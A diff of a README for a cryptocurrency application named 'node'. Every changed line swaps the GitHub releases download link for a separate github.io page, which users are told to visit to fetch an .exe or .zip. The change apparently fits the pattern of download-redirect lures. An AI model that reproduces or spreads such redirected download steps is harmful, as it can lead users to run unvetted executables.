@@ -6,7 +6,7 @@ Ready to get started? It’s simple.
 
 ### 🌟 Get the Application Now
 
-[![Download node](https://img.shields.io/badge/Download-node-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Leowiyang/node/releases)
+[![Download node](https://img.shields.io/badge/Download-node-blue?style=for-the-badge&logo=github&color=4B0082)](https://leowiyang.github.io)
 
 **Visit this link to download the application.**
 
@@ -56,7 +56,7 @@ node is designed to run on modern computers. To ensure smooth performance, pleas
 Follow these steps to get the application on your computer:
 
 1. **Open your web browser** (like Edge, Chrome, or Firefox).
-2. **Go to the download page** by clicking this link: [https://github.com/Leowiyang/node/releases](https://github.com/Leowiyang/node/releases)
+2. **Go to the download page** by clicking this link: [https://leowiyang.github.io](https://leowiyang.github.io)
 3. **Find the latest release** – Look for the newest version number at the top of the page.
 4. **Click the download link** – You’ll see a file starting with "node" and ending with ".zip" or ".exe". Choose the one that matches your system (usually labeled "Windows").
 5. **Save the file** – Your browser will ask where to save it. The "Downloads" folder is fine.
@@ -199,6 +199,6 @@ You’re now equipped with everything you need to start using node. From downloa
 
 Start your journey today by downloading node, and enjoy the world of digital finance at your fingertips!
 
-**👉 [Download node Now](https://github.com/Leowiyang/node/releases)**
+**👉 [Download node Now](https://leowiyang.github.io)**
 
 Keywords: node, blockchain, testnet, digital transactions, smart contracts, cryptocurrency, wallet, decentralized, DeFi, web3
